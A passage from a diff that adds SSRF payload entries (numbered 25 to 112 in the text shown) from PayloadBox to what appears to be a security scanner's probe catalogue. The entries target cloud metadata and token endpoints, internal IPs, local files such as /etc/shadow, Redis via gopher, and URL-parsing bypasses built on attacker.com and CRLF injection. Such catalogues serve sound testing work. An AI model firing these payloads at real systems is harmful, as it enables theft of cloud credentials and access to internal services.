+    "description": "SSRF probe from PayloadBox (ssrf-injection.txt). Tests application handling of: http://instance-data.ec2.internal",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "ssrf-injection.txt"
+  },
+  {
+    "id": "ssrf-pbox-0026",
+    "name": "Ssrf Injection #26",
+    "template": "http://metadata.google.internal",
+    "description": "SSRF probe from PayloadBox (ssrf-injection.txt). Tests application handling of: http://metadata.google.internal",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "ssrf-injection.txt"
+  },
+  {
+    "id": "ssrf-pbox-0027",
+    "name": "Ssrf Injection #27",
+    "template": "http://metadata.google.internal/computeMetadata/v1/project/",
+    "description": "SSRF probe from PayloadBox (ssrf-injection.txt). Tests application handling of: http://metadata.google.internal/computeMetadata/v1/project/",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "ssrf-injection.txt"
+  },
+  {
+    "id": "ssrf-pbox-0028",
+    "name": "Ssrf Injection #28",
+    "template": "http://metadata/computeMetadata/v1/",
+    "description": "SSRF probe from PayloadBox (ssrf-injection.txt). Tests application handling of: http://metadata/computeMetadata/v1/",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "ssrf-injection.txt"
+  },
+  {
+    "id": "ssrf-pbox-0029",
+    "name": "Ssrf Injection #29",
+    "template": "http://metadata.google.internal/computeMetadata/v1/instance/attributes/kube-env",
+    "description": "SSRF probe from PayloadBox (ssrf-injection.txt). Tests application handling of: http://metadata.google.internal/computeMetadata/v1/instance/...",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "ssrf-injection.txt"
+  },
+  {
+    "id": "ssrf-pbox-0030",
+    "name": "Ssrf Injection #30",
+    "template": "http://169.254.169.254/metadata/identity/oauth2/token",
+    "description": "SSRF probe from PayloadBox (ssrf-injection.txt). Tests application handling of: http://169.254.169.254/metadata/identity/oauth2/token",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "ssrf-injection.txt"
+  },
+  {
+    "id": "ssrf-pbox-0031",
+    "name": "Ssrf Injection #31",
+    "template": "http://169.254.169.254/metadata/instance",
+    "description": "SSRF probe from PayloadBox (ssrf-injection.txt). Tests application handling of: http://169.254.169.254/metadata/instance",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "ssrf-injection.txt"
+  },
+  {
+    "id": "ssrf-pbox-0032",
+    "name": "Ssrf Injection #32",
+    "template": "http://169.254.169.254/metadata/instance/compute",
+    "description": "SSRF probe from PayloadBox (ssrf-injection.txt). Tests application handling of: http://169.254.169.254/metadata/instance/compute",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "ssrf-injection.txt"
+  },
+  {
+    "id": "ssrf-pbox-0033",
+    "name": "Ssrf Injection #33",
+    "template": "http://169.254.169.254/metadata/v1.json",
+    "description": "SSRF probe from PayloadBox (ssrf-injection.txt). Tests application handling of: http://169.254.169.254/metadata/v1.json",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "ssrf-injection.txt"
+  },
+  {
+    "id": "ssrf-pbox-0034",
+    "name": "Ssrf Injection #34",
+    "template": "http://169.254.169.254/metadata/v1/user-data",
+    "description": "SSRF probe from PayloadBox (ssrf-injection.txt). Tests application handling of: http://169.254.169.254/metadata/v1/user-data",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "ssrf-injection.txt"
+  },
+  {
+    "id": "ssrf-pbox-0035",
+    "name": "Ssrf Injection #35",
+    "template": "http://169.254.169.254/metadata/v1/hostname",
+    "description": "SSRF probe from PayloadBox (ssrf-injection.txt). Tests application handling of: http://169.254.169.254/metadata/v1/hostname",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "ssrf-injection.txt"
+  },
+  {
+    "id": "ssrf-pbox-0036",
+    "name": "Ssrf Injection #36",
+    "template": "http://169.254.169.254/opc/v1/instance/",
+    "description": "SSRF probe from PayloadBox (ssrf-injection.txt). Tests application handling of: http://169.254.169.254/opc/v1/instance/",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "ssrf-injection.txt"
+  },
+  {
+    "id": "ssrf-pbox-0037",
+    "name": "Ssrf Injection #37",
+    "template": "http://169.254.169.254/opc/v2/instance/",
+    "description": "SSRF probe from PayloadBox (ssrf-injection.txt). Tests application handling of: http://169.254.169.254/opc/v2/instance/",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "ssrf-injection.txt"
+  },
+  {
+    "id": "ssrf-pbox-0038",
+    "name": "Ssrf Injection #38",
+    "template": "http://100.100.100.200/latest/meta-data/",
+    "description": "SSRF probe from PayloadBox (ssrf-injection.txt). Tests application handling of: http://100.100.100.200/latest/meta-data/",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "ssrf-injection.txt"
+  },
+  {
+    "id": "ssrf-pbox-0039",
+    "name": "Ssrf Injection #39",
+    "template": "http://100.100.100.200/latest/meta-data/instance-id",
+    "description": "SSRF probe from PayloadBox (ssrf-injection.txt). Tests application handling of: http://100.100.100.200/latest/meta-data/instance-id",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "ssrf-injection.txt"
+  },
+  {
+    "id": "ssrf-pbox-0040",
+    "name": "Ssrf Injection #40",
+    "template": "http://169.254.169.254/openstack",
+    "description": "SSRF probe from PayloadBox (ssrf-injection.txt). Tests application handling of: http://169.254.169.254/openstack",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "ssrf-injection.txt"
+  },
+  {
+    "id": "ssrf-pbox-0041",
+    "name": "Ssrf Injection #41",
+    "template": "http://10.255.255.255",
+    "description": "SSRF probe from PayloadBox (ssrf-injection.txt). Tests application handling of: http://10.255.255.255",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "ssrf-injection.txt"
+  },
+  {
+    "id": "ssrf-pbox-0042",
+    "name": "Ssrf Injection #42",
+    "template": "http://10.0.0.1:22",
+    "description": "SSRF probe from PayloadBox (ssrf-injection.txt). Tests application handling of: http://10.0.0.1:22",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "ssrf-injection.txt"
+  },
+  {
+    "id": "ssrf-pbox-0043",
+    "name": "Ssrf Injection #43",
+    "template": "http://10.0.0.1:3389",
+    "description": "SSRF probe from PayloadBox (ssrf-injection.txt). Tests application handling of: http://10.0.0.1:3389",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "ssrf-injection.txt"
+  },
+  {
+    "id": "ssrf-pbox-0044",
+    "name": "Ssrf Injection #44",
+    "template": "http://10.0.0.1:8080",
+    "description": "SSRF probe from PayloadBox (ssrf-injection.txt). Tests application handling of: http://10.0.0.1:8080",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "ssrf-injection.txt"
+  },
+  {
+    "id": "ssrf-pbox-0045",
+    "name": "Ssrf Injection #45",
+    "template": "http://172.31.255.255",
+    "description": "SSRF probe from PayloadBox (ssrf-injection.txt). Tests application handling of: http://172.31.255.255",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "ssrf-injection.txt"
+  },
+  {
+    "id": "ssrf-pbox-0046",
+    "name": "Ssrf Injection #46",
+    "template": "http://192.168.1.254",
+    "description": "SSRF probe from PayloadBox (ssrf-injection.txt). Tests application handling of: http://192.168.1.254",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "ssrf-injection.txt"
+  },
+  {
+    "id": "ssrf-pbox-0047",
+    "name": "Ssrf Injection #47",
+    "template": "http://192.168.255.255",
+    "description": "SSRF probe from PayloadBox (ssrf-injection.txt). Tests application handling of: http://192.168.255.255",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "ssrf-injection.txt"
+  },
+  {
+    "id": "ssrf-pbox-0048",
+    "name": "Ssrf Injection #48",
+    "template": "http://192.168.1.1:80",
+    "description": "SSRF probe from PayloadBox (ssrf-injection.txt). Tests application handling of: http://192.168.1.1:80",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "ssrf-injection.txt"
+  },
+  {
+    "id": "ssrf-pbox-0049",
+    "name": "Ssrf Injection #49",
+    "template": "http://192.168.1.1:443",
+    "description": "SSRF probe from PayloadBox (ssrf-injection.txt). Tests application handling of: http://192.168.1.1:443",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "ssrf-injection.txt"
+  },
+  {
+    "id": "ssrf-pbox-0050",
+    "name": "Ssrf Injection #50",
+    "template": "http://169.254.255.255",
+    "description": "SSRF probe from PayloadBox (ssrf-injection.txt). Tests application handling of: http://169.254.255.255",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "ssrf-injection.txt"
+  },
+  {
+    "id": "ssrf-pbox-0051",
+    "name": "Ssrf Injection #51",
+    "template": "http://169.254.1.1",
+    "description": "SSRF probe from PayloadBox (ssrf-injection.txt). Tests application handling of: http://169.254.1.1",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "ssrf-injection.txt"
+  },
+  {
+    "id": "ssrf-pbox-0052",
+    "name": "Ssrf Injection #52",
+    "template": "http://[fe80::1]",
+    "description": "SSRF probe from PayloadBox (ssrf-injection.txt). Tests application handling of: http://[fe80::1]",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "ssrf-injection.txt"
+  },
+  {
+    "id": "ssrf-pbox-0053",
+    "name": "Ssrf Injection #53",
+    "template": "http://[fe80::1%eth0]",
+    "description": "SSRF probe from PayloadBox (ssrf-injection.txt). Tests application handling of: http://[fe80::1%eth0]",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "ssrf-injection.txt"
+  },
+  {
+    "id": "ssrf-pbox-0054",
+    "name": "Ssrf Injection #54",
+    "template": "http://127.0.0.0",
+    "description": "SSRF probe from PayloadBox (ssrf-injection.txt). Tests application handling of: http://127.0.0.0",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "ssrf-injection.txt"
+  },
+  {
+    "id": "ssrf-pbox-0055",
+    "name": "Ssrf Injection #55",
+    "template": "http://127.255.255.255",
+    "description": "SSRF probe from PayloadBox (ssrf-injection.txt). Tests application handling of: http://127.255.255.255",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "ssrf-injection.txt"
+  },
+  {
+    "id": "ssrf-pbox-0056",
+    "name": "Ssrf Injection #56",
+    "template": "http://127.127.127.127",
+    "description": "SSRF probe from PayloadBox (ssrf-injection.txt). Tests application handling of: http://127.127.127.127",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "ssrf-injection.txt"
+  },
+  {
+    "id": "ssrf-pbox-0057",
+    "name": "Ssrf Injection #57",
+    "template": "file:///etc/shadow",
+    "description": "SSRF probe from PayloadBox (ssrf-injection.txt). Tests application handling of: file:///etc/shadow",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "ssrf-injection.txt"
+  },
+  {
+    "id": "ssrf-pbox-0058",
+    "name": "Ssrf Injection #58",
+    "template": "file:///etc/hosts",
+    "description": "SSRF probe from PayloadBox (ssrf-injection.txt). Tests application handling of: file:///etc/hosts",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "ssrf-injection.txt"
+  },
+  {
+    "id": "ssrf-pbox-0059",
+    "name": "Ssrf Injection #59",
+    "template": "file:///proc/self/environ",
+    "description": "SSRF probe from PayloadBox (ssrf-injection.txt). Tests application handling of: file:///proc/self/environ",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "ssrf-injection.txt"
+  },
+  {
+    "id": "ssrf-pbox-0060",
+    "name": "Ssrf Injection #60",
+    "template": "file:///proc/self/cmdline",
+    "description": "SSRF probe from PayloadBox (ssrf-injection.txt). Tests application handling of: file:///proc/self/cmdline",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "ssrf-injection.txt"
+  },
+  {
+    "id": "ssrf-pbox-0061",
+    "name": "Ssrf Injection #61",
+    "template": "file:///proc/self/cwd",
+    "description": "SSRF probe from PayloadBox (ssrf-injection.txt). Tests application handling of: file:///proc/self/cwd",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "ssrf-injection.txt"
+  },
+  {
+    "id": "ssrf-pbox-0062",
+    "name": "Ssrf Injection #62",
+    "template": "file:///var/log/apache2/access.log",
+    "description": "SSRF probe from PayloadBox (ssrf-injection.txt). Tests application handling of: file:///var/log/apache2/access.log",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "ssrf-injection.txt"
+  },
+  {
+    "id": "ssrf-pbox-0063",
+    "name": "Ssrf Injection #63",
+    "template": "file:///var/log/nginx/access.log",
+    "description": "SSRF probe from PayloadBox (ssrf-injection.txt). Tests application handling of: file:///var/log/nginx/access.log",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "ssrf-injection.txt"
+  },
+  {
+    "id": "ssrf-pbox-0064",
+    "name": "Ssrf Injection #64",
+    "template": "file:///C:/windows/system32/drivers/etc/hosts",
+    "description": "SSRF probe from PayloadBox (ssrf-injection.txt). Tests application handling of: file:///C:/windows/system32/drivers/etc/hosts",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "ssrf-injection.txt"
+  },
+  {
+    "id": "ssrf-pbox-0065",
+    "name": "Ssrf Injection #65",
+    "template": "file:///C:/windows/win.ini",
+    "description": "SSRF probe from PayloadBox (ssrf-injection.txt). Tests application handling of: file:///C:/windows/win.ini",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "ssrf-injection.txt"
+  },
+  {
+    "id": "ssrf-pbox-0066",
+    "name": "Ssrf Injection #66",
+    "template": "dict://localhost:11211",
+    "description": "SSRF probe from PayloadBox (ssrf-injection.txt). Tests application handling of: dict://localhost:11211",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "ssrf-injection.txt"
+  },
+  {
+    "id": "ssrf-pbox-0067",
+    "name": "Ssrf Injection #67",
+    "template": "gopher://localhost:6379",
+    "description": "SSRF probe from PayloadBox (ssrf-injection.txt). Tests application handling of: gopher://localhost:6379",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "ssrf-injection.txt"
+  },
+  {
+    "id": "ssrf-pbox-0068",
+    "name": "Ssrf Injection #68",
+    "template": "gopher://127.0.0.1:6379/_",
+    "description": "SSRF probe from PayloadBox (ssrf-injection.txt). Tests application handling of: gopher://127.0.0.1:6379/_",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "ssrf-injection.txt"
+  },
+  {
+    "id": "ssrf-pbox-0069",
+    "name": "Ssrf Injection #69",
+    "template": "ldap://localhost",
+    "description": "SSRF probe from PayloadBox (ssrf-injection.txt). Tests application handling of: ldap://localhost",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "ssrf-injection.txt"
+  },
+  {
+    "id": "ssrf-pbox-0070",
+    "name": "Ssrf Injection #70",
+    "template": "ldaps://localhost",
+    "description": "SSRF probe from PayloadBox (ssrf-injection.txt). Tests application handling of: ldaps://localhost",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "ssrf-injection.txt"
+  },
+  {
+    "id": "ssrf-pbox-0071",
+    "name": "Ssrf Injection #71",
+    "template": "ftp://localhost",
+    "description": "SSRF probe from PayloadBox (ssrf-injection.txt). Tests application handling of: ftp://localhost",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "ssrf-injection.txt"
+  },
+  {
+    "id": "ssrf-pbox-0072",
+    "name": "Ssrf Injection #72",
+    "template": "ftps://localhost",
+    "description": "SSRF probe from PayloadBox (ssrf-injection.txt). Tests application handling of: ftps://localhost",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "ssrf-injection.txt"
+  },
+  {
+    "id": "ssrf-pbox-0073",
+    "name": "Ssrf Injection #73",
+    "template": "tftp://localhost",
+    "description": "SSRF probe from PayloadBox (ssrf-injection.txt). Tests application handling of: tftp://localhost",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "ssrf-injection.txt"
+  },
+  {
+    "id": "ssrf-pbox-0074",
+    "name": "Ssrf Injection #74",
+    "template": "sftp://localhost",
+    "description": "SSRF probe from PayloadBox (ssrf-injection.txt). Tests application handling of: sftp://localhost",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "ssrf-injection.txt"
+  },
+  {
+    "id": "ssrf-pbox-0075",
+    "name": "Ssrf Injection #75",
+    "template": "http://attacker.com@127.0.0.1",
+    "description": "SSRF probe from PayloadBox (ssrf-injection.txt). Tests application handling of: http://attacker.com@127.0.0.1",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "ssrf-injection.txt"
+  },
+  {
+    "id": "ssrf-pbox-0076",
+    "name": "Ssrf Injection #76",
+    "template": "http://127.0.0.1@attacker.com",
+    "description": "SSRF probe from PayloadBox (ssrf-injection.txt). Tests application handling of: http://127.0.0.1@attacker.com",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "ssrf-injection.txt"
+  },
+  {
+    "id": "ssrf-pbox-0077",
+    "name": "Ssrf Injection #77",
+    "template": "http://attacker.com:80@127.0.0.1",
+    "description": "SSRF probe from PayloadBox (ssrf-injection.txt). Tests application handling of: http://attacker.com:80@127.0.0.1",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "ssrf-injection.txt"
+  },
+  {
+    "id": "ssrf-pbox-0078",
+    "name": "Ssrf Injection #78",
+    "template": "http://localhost@attacker.com",
+    "description": "SSRF probe from PayloadBox (ssrf-injection.txt). Tests application handling of: http://localhost@attacker.com",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "ssrf-injection.txt"
+  },
+  {
+    "id": "ssrf-pbox-0079",
+    "name": "Ssrf Injection #79",
+    "template": "http://attacker.com#127.0.0.1",
+    "description": "SSRF probe from PayloadBox (ssrf-injection.txt). Tests application handling of: http://attacker.com#127.0.0.1",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "ssrf-injection.txt"
+  },
+  {
+    "id": "ssrf-pbox-0080",
+    "name": "Ssrf Injection #80",
+    "template": "http://attacker.com#@127.0.0.1",
+    "description": "SSRF probe from PayloadBox (ssrf-injection.txt). Tests application handling of: http://attacker.com#@127.0.0.1",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "ssrf-injection.txt"
+  },
+  {
+    "id": "ssrf-pbox-0081",
+    "name": "Ssrf Injection #81",
+    "template": "http://127.0.0.1#attacker.com",
+    "description": "SSRF probe from PayloadBox (ssrf-injection.txt). Tests application handling of: http://127.0.0.1#attacker.com",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "ssrf-injection.txt"
+  },
+  {
+    "id": "ssrf-pbox-0082",
+    "name": "Ssrf Injection #82",
+    "template": "http://127.0.0.1\\attacker.com",
+    "description": "SSRF probe from PayloadBox (ssrf-injection.txt). Tests application handling of: http://127.0.0.1\\attacker.com",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "ssrf-injection.txt"
+  },
+  {
+    "id": "ssrf-pbox-0083",
+    "name": "Ssrf Injection #83",
+    "template": "http://attacker.com\\127.0.0.1",
+    "description": "SSRF probe from PayloadBox (ssrf-injection.txt). Tests application handling of: http://attacker.com\\127.0.0.1",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "ssrf-injection.txt"
+  },
+  {
+    "id": "ssrf-pbox-0084",
+    "name": "Ssrf Injection #84",
+    "template": "http://localhost\\attacker.com",
+    "description": "SSRF probe from PayloadBox (ssrf-injection.txt). Tests application handling of: http://localhost\\attacker.com",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "ssrf-injection.txt"
+  },
+  {
+    "id": "ssrf-pbox-0085",
+    "name": "Ssrf Injection #85",
+    "template": "http://attacker.com?127.0.0.1",
+    "description": "SSRF probe from PayloadBox (ssrf-injection.txt). Tests application handling of: http://attacker.com?127.0.0.1",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "ssrf-injection.txt"
+  },
+  {
+    "id": "ssrf-pbox-0086",
+    "name": "Ssrf Injection #86",
+    "template": "http://127.0.0.1?attacker.com",
+    "description": "SSRF probe from PayloadBox (ssrf-injection.txt). Tests application handling of: http://127.0.0.1?attacker.com",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "ssrf-injection.txt"
+  },
+  {
+    "id": "ssrf-pbox-0087",
+    "name": "Ssrf Injection #87",
+    "template": "http://127.0.0.1;attacker.com",
+    "description": "SSRF probe from PayloadBox (ssrf-injection.txt). Tests application handling of: http://127.0.0.1;attacker.com",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "ssrf-injection.txt"
+  },
+  {
+    "id": "ssrf-pbox-0088",
+    "name": "Ssrf Injection #88",
+    "template": "http://attacker.com;127.0.0.1",
+    "description": "SSRF probe from PayloadBox (ssrf-injection.txt). Tests application handling of: http://attacker.com;127.0.0.1",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "ssrf-injection.txt"
+  },
+  {
+    "id": "ssrf-pbox-0089",
+    "name": "Ssrf Injection #89",
+    "template": "http://127.0.0.1/%2e%2e/%2e%2e/etc/passwd",
+    "description": "SSRF probe from PayloadBox (ssrf-injection.txt). Tests application handling of: http://127.0.0.1/%2e%2e/%2e%2e/etc/passwd",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "ssrf-injection.txt"
+  },
+  {
+    "id": "ssrf-pbox-0090",
+    "name": "Ssrf Injection #90",
+    "template": "http://127.0.0.1%00.attacker.com",
+    "description": "SSRF probe from PayloadBox (ssrf-injection.txt). Tests application handling of: http://127.0.0.1%00.attacker.com",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "ssrf-injection.txt"
+  },
+  {
+    "id": "ssrf-pbox-0091",
+    "name": "Ssrf Injection #91",
+    "template": "http://127.0.0.1%0a.attacker.com",
+    "description": "SSRF probe from PayloadBox (ssrf-injection.txt). Tests application handling of: http://127.0.0.1%0a.attacker.com",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "ssrf-injection.txt"
+  },
+  {
+    "id": "ssrf-pbox-0092",
+    "name": "Ssrf Injection #92",
+    "template": "http://127.0.0.1%0d.attacker.com",
+    "description": "SSRF probe from PayloadBox (ssrf-injection.txt). Tests application handling of: http://127.0.0.1%0d.attacker.com",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "ssrf-injection.txt"
+  },
+  {
+    "id": "ssrf-pbox-0093",
+    "name": "Ssrf Injection #93",
+    "template": "http://%31%32%37%2e%30%2e%30%2e%31",
+    "description": "SSRF probe from PayloadBox (ssrf-injection.txt). Tests application handling of: http://%31%32%37%2e%30%2e%30%2e%31",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "ssrf-injection.txt"
+  },
+  {
+    "id": "ssrf-pbox-0094",
+    "name": "Ssrf Injection #94",
+    "template": "http://127.0.0.1%2f..",
+    "description": "SSRF probe from PayloadBox (ssrf-injection.txt). Tests application handling of: http://127.0.0.1%2f..",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "ssrf-injection.txt"
+  },
+  {
+    "id": "ssrf-pbox-0095",
+    "name": "Ssrf Injection #95",
+    "template": "http://127.0.0.1%5c..",
+    "description": "SSRF probe from PayloadBox (ssrf-injection.txt). Tests application handling of: http://127.0.0.1%5c..",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "ssrf-injection.txt"
+  },
+  {
+    "id": "ssrf-pbox-0096",
+    "name": "Ssrf Injection #96",
+    "template": "http://%32%35%37%2e%32%35%37%2e%32%35%37%2e%32%35%37",
+    "description": "SSRF probe from PayloadBox (ssrf-injection.txt). Tests application handling of: http://%32%35%37%2e%32%35%37%2e%32%35%37%2e%32%35%37",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "ssrf-injection.txt"
+  },
+  {
+    "id": "ssrf-pbox-0097",
+    "name": "Ssrf Injection #97",
+    "template": "http://%32%35%35%2e%32%35%35%2e%32%35%35%2e%32%35%35",
+    "description": "SSRF probe from PayloadBox (ssrf-injection.txt). Tests application handling of: http://%32%35%35%2e%32%35%35%2e%32%35%35%2e%32%35%35",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "ssrf-injection.txt"
+  },
+  {
+    "id": "ssrf-pbox-0098",
+    "name": "Ssrf Injection #98",
+    "template": "http://127.0.0.1.attacker.com",
+    "description": "SSRF probe from PayloadBox (ssrf-injection.txt). Tests application handling of: http://127.0.0.1.attacker.com",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "ssrf-injection.txt"
+  },
+  {
+    "id": "ssrf-pbox-0099",
+    "name": "Ssrf Injection #99",
+    "template": "http://localhost.attacker.com",
+    "description": "SSRF probe from PayloadBox (ssrf-injection.txt). Tests application handling of: http://localhost.attacker.com",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "ssrf-injection.txt"
+  },
+  {
+    "id": "ssrf-pbox-0100",
+    "name": "Ssrf Injection #100",
+    "template": "http://attacker.com.127.0.0.1.nip.io",
+    "description": "SSRF probe from PayloadBox (ssrf-injection.txt). Tests application handling of: http://attacker.com.127.0.0.1.nip.io",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "ssrf-injection.txt"
+  },
+  {
+    "id": "ssrf-pbox-0101",
+    "name": "Ssrf Injection #101",
+    "template": "http://127.0.0.1.nip.io",
+    "description": "SSRF probe from PayloadBox (ssrf-injection.txt). Tests application handling of: http://127.0.0.1.nip.io",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "ssrf-injection.txt"
+  },
+  {
+    "id": "ssrf-pbox-0102",
+    "name": "Ssrf Injection #102",
+    "template": "http://127.0.0.1.xip.io",
+    "description": "SSRF probe from PayloadBox (ssrf-injection.txt). Tests application handling of: http://127.0.0.1.xip.io",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "ssrf-injection.txt"
+  },
+  {
+    "id": "ssrf-pbox-0103",
+    "name": "Ssrf Injection #103",
+    "template": "http://127.0.0.1.xip.name",
+    "description": "SSRF probe from PayloadBox (ssrf-injection.txt). Tests application handling of: http://127.0.0.1.xip.name",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "ssrf-injection.txt"
+  },
+  {
+    "id": "ssrf-pbox-0104",
+    "name": "Ssrf Injection #104",
+    "template": "http://127.0.0.1.sslip.io",
+    "description": "SSRF probe from PayloadBox (ssrf-injection.txt). Tests application handling of: http://127.0.0.1.sslip.io",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "ssrf-injection.txt"
+  },
+  {
+    "id": "ssrf-pbox-0105",
+    "name": "Ssrf Injection #105",
+    "template": "http://7f000001.rbndr.us",
+    "description": "SSRF probe from PayloadBox (ssrf-injection.txt). Tests application handling of: http://7f000001.rbndr.us",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "ssrf-injection.txt"
+  },
+  {
+    "id": "ssrf-pbox-0106",
+    "name": "Ssrf Injection #106",
+    "template": "http://cname-to-127-0-0-1.example.com",
+    "description": "SSRF probe from PayloadBox (ssrf-injection.txt). Tests application handling of: http://cname-to-127-0-0-1.example.com",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "ssrf-injection.txt"
+  },
+  {
+    "id": "ssrf-pbox-0107",
+    "name": "Ssrf Injection #107",
+    "template": "http://internal.example.com",
+    "description": "SSRF probe from PayloadBox (ssrf-injection.txt). Tests application handling of: http://internal.example.com",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "ssrf-injection.txt"
+  },
+  {
+    "id": "ssrf-pbox-0108",
+    "name": "Ssrf Injection #108",
+    "template": "http://attacker.com%0d%0aHost:%20127.0.0.1",
+    "description": "SSRF probe from PayloadBox (ssrf-injection.txt). Tests application handling of: http://attacker.com%0d%0aHost:%20127.0.0.1",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "ssrf-injection.txt"
+  },
+  {
+    "id": "ssrf-pbox-0109",
+    "name": "Ssrf Injection #109",
+    "template": "http://attacker.com%0aHost:%20localhost",
+    "description": "SSRF probe from PayloadBox (ssrf-injection.txt). Tests application handling of: http://attacker.com%0aHost:%20localhost",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "ssrf-injection.txt"
+  },
+  {
+    "id": "ssrf-pbox-0110",
+    "name": "Ssrf Injection #110",
+    "template": "http://attacker.com%0d%0aSet-Cookie:%20admin=true",
+    "description": "SSRF probe from PayloadBox (ssrf-injection.txt). Tests application handling of: http://attacker.com%0d%0aSet-Cookie:%20admin=true",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "ssrf-injection.txt"
+  },
+  {
+    "id": "ssrf-pbox-0111",
+    "name": "Ssrf Injection #111",
+    "template": "http://localhost:1",
+    "description": "SSRF probe from PayloadBox (ssrf-injection.txt). Tests application handling of: http://localhost:1",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "ssrf-injection.txt"
+  },
+  {
+    "id": "ssrf-pbox-0112",
+    "name": "Ssrf Injection #112",
+    "template": "http://localhost:23",
